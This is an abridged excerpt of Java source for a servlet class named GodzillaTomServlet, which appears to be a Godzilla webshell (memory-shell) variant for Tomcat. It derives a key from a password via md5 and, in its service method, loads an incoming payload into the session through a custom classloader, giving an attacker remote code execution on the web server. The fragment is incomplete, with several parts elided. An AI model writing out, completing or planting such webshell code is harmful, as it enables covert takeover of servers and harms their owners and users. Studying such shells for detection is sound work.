...
public class GodzillaTomServlet extends ClassLoader implements Servlet {
    ...
    public GodzillaTomServlet() {
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    public GodzillaTomServlet(ClassLoader z) {
        super(z);
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }
    ...
    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        try {
            ...
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new GodzillaTomServlet(this.getClass().getClassLoader())).Q(data));
            } else {
